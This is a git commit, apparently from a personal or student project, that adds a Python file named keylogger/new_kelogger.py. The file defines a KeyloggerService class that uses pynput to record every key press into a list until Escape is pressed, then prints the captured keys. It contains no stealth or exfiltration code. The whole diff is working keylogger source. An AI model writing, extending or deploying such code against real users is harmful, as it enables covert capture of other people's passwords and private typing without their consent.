7316e40bedf385a3819c6a490e83393dfdc83f14
Yisrael <yisraeljakob@gmail.com>
2025-02-16 12:22:09 +0200

    Added Files

---
+++ keylogger/new_kelogger.py
@@ -0,0 +1,27 @@
+from inter_face import IKeyLogger
+from typing import List
+from pynput.keyboard import Key, Listener, KeyCode
+
+
+class KeyloggerService(IKeyLogger):
+    def __init__(self):
+        self.presses = list()
+
+    def start_logging(self) -> None:
+        with Listener(on_press= self.press) as self.listener:
+            self.listener.join()
+
+    def stop_logging(self) -> None:
+        self.listener.stop()
+
+    def get_logged_keys(self) -> List[str]:
+        return self.presses
+
+    def press(self,key):
+        if key == Key.esc:
+            self.stop_logging()
+        self.presses.append(key)
+
+x = KeyloggerService()
+x.start_logging()
+print(x.get_logged_keys())
